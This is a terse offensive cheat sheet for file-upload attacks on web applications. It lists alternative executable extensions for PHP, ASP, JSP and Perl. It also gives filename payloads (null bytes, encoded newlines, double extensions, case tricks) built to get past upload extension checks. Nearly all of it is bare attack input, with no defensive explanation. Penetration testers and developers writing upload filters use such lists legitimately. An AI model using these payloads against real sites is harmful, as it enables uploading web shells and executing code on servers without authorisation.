Extensions alternatives:

```
PHP: php, php2, php3, php4, php5, php6, php7, phps, pht, phtml, pgif, shtml, phar, inc, hphp, ctp, module

ASP: asp, aspx, config, ashx, asmx, aspq, axd, cshtm, cshtml, rem, soap, vbhtm, vbhtml, asa, cer, shtml

Jsp: jsp, jspx, jsw, jsv, jspf, wss, dp, action

Perl: pl, cgi
```

Bypass check extension:

```
test.png.php
---
test.php%20
test.php%0a
test.php%00
test.php%0d%0a
test.php/
test.php.\
test.pHp5
---
test.png.pHp5
test.php#.png
test.php%00.png
test.php\x00.png
test.php%0a.png
test.php%0d%0a.png
test.phpJunk123png
---
test.php.jpg.php
test.php%00.png%%00.jpg
etc...
```
